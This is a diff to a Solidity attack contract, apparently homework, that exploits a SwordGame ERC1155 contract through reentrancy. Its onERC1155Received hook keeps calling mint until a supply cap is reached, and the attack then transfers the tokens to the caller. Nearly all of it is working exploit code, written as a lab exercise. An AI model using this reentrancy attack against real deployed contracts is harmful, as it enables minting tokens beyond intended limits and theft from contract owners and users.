@@ -2,12 +2,12 @@
 pragma solidity ^0.8.20;
 
 import {SwordGame} from "src/hw/hw1.sol";
-import {Test, console} from "forge-std/Test.sol";
 
 contract AttackHW1 {
     SwordGame public swordGame;
     uint256 public tokenId = 1;
     uint256 public nftCount;
+    uint16 public maxSupply = 10;
 
     constructor(SwordGame _swordGame) {
         swordGame = _swordGame;
@@ -17,6 +17,7 @@ contract AttackHW1 {
 
     function attack() public payable {
         swordGame.mint{value: 1 ether}(tokenId);
+        swordGame.safeTransferFrom(address(this), msg.sender, tokenId, 10, "");
     }
 
     function onERC1155Received(
@@ -27,13 +28,12 @@ contract AttackHW1 {
         bytes calldata // data
     ) external returns (bytes4) {
         nftCount += amount;
-        console.log("nftCount", nftCount);
+
         // 循环调用 mint 函数
-        while (nftCount < 10) {
+        while (nftCount < maxSupply) {
             try swordGame.mint{value: 1 ether}(tokenId) {
                 nftCount++;
             } catch {
-                console.log("error", nftCount);
                 break;
             }
         }
